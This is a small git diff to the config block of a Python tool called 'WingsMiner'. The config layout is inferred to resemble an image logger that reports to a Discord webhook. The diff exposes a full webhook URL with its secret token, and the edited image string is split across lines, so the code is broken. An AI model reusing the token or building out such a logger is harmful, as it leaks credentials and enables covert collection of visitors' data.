@@ -23,7 +23,8 @@ __author__ = "lynxWings"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1144995912490438726/DKnMB6uNege9Ija_Szb6EL0Ioh3AABGOfeYHNMQ1MAjp91V-FNgkKyGG5OP8-Lgk5ZaX", # <------------------------- Put your webhook link here.
-    "image": "your_image_address_link_here", # <------------------------- Put image address link here.
+    "image": "https://imgs.search.brave.com/yYFjCe-_5HnxgSRTVaopuS3xLrGo0gO7xQVqrCl6Djw/rs:fit:500:0:0/g:ce/aHR0cHM6Ly9tZWRp/YS5nZXR0eWltYWdl/cy5jb20vaWQvMTI5/Nzc2MTcxOS9waG90/by9mbGFnLW9mLWdl/cm1hbnktYmxvd2lu/Zy1pbi10aGUtd2lu/ZC5qcGc_cz02MTJ4/NjEyJnc9MCZrPTIw/JmM9elV6YXZlaHlk/Y283U3ptYTExTmNX/blRNR2F4RGJEMWtG/c3RfMlZpWVQwWT0
+    ", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "WingsMiner",
